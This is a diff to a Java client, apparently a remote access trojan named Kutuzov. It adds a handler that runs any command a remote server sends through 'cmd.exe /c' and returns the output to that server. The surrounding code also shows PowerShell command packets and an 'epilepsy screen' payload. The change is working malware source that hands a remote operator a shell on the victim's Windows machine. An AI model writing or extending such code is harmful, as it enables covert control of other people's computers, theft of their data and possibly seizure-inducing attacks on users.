@@ -2,10 +2,7 @@ package me.kutuzov.client;
 
 import com.profesorfalken.jpowershell.PowerShell;
 import me.kutuzov.client.payloads.Payloads;
-import me.kutuzov.packet.CSPowershellResponsePacket;
-import me.kutuzov.packet.Packet;
-import me.kutuzov.packet.SCEpilepsyPacket;
-import me.kutuzov.packet.SCPowershellCommandPacket;
+import me.kutuzov.packet.*;
 
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
@@ -54,6 +51,31 @@ public class KutuzovWinPackets {
                     Thread.sleep(scEpilepsyPacket.time);
                 } catch (InterruptedException e) {}
                 Payloads.epilepsyScreenEnabled.set(false);
+            }).start();
+        } else if(packet instanceof SCWinCommandPacket) {
+            new Thread(() -> {
+                SCWinCommandPacket p = (SCWinCommandPacket)packet;
+                String command = p.command;
+                String result = "";
+
+                try {
+                    ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", command);
+                    builder.redirectErrorStream(true);
+                    Process process = builder.start();
+                    BufferedReader r = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                    String line;
+                    while (true) {
+                        line = r.readLine();
+                        if (line == null)
+                            break;
+
+                        result+=line+"\n";
+                    }
+                } catch (Exception exception) {}
+
+                try {
+                    oos.writeObject(new CSWinCommandResponsePacket(result));
+                } catch (Exception e) { e.printStackTrace(); }
             }).start();
         }
     }
